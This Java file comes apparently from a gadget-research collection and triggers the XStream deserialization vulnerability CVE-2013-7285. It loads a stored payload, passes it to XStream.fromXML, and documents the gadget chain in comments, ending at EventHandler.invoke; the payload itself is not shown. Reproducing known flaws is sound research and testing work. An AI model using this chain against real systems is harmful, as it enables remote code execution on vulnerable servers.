package com.sec.exploits.XStream.CVE_2013_7285;

import com.sec.annotation.Dependencies;
import com.sec.exploits.XStream.XStreamUtils;
import com.thoughtworks.xstream.XStream;

import java.io.FileInputStream;
import java.io.FileNotFoundException;

/**
 * @program: Gadgets
 * @description:
 * @author: 0range
 * @create: 2021-07-28 18:35
 **/

/**
 * XStream.fromXML
 * XStream.unmarshal
 * AbstractTreeMarshallingStrategy.unmarshal
 * TreeUnmarshaller.start
 * HierarchicalStreams.readClassType
 * TreeUnmarshaller.convertAnother
 * DefaultConverterLookup.lookupConverterForType
 * ...
 * TreeSetConverter.unmarshal
 * TreeSetConverter.populateTreeMap
 * DynamicProxyConverter.unmarshal
 * ...
 * ReflectionConverter.canConvert
 * ...
 * TreeMap.putAll
 * AbstractMap.putAll
 * TreeMap.put
 * $Proxy0.compareTo
 * EventHandler.invoke
 * EventHandler.invokeInternal
 * MethodUtil.invoke
 */


@Dependencies({
        "XStream<=1.4.6 & 1.4.10"
})
public class SortedSet_Exploit {
    public static void main(String[] args) throws FileNotFoundException {
        FileInputStream payload = XStreamUtils.getPayload("CVE_2013_7285_SortedSet");
        XStream xStream = new XStream();
        xStream.fromXML(payload);
    }
}
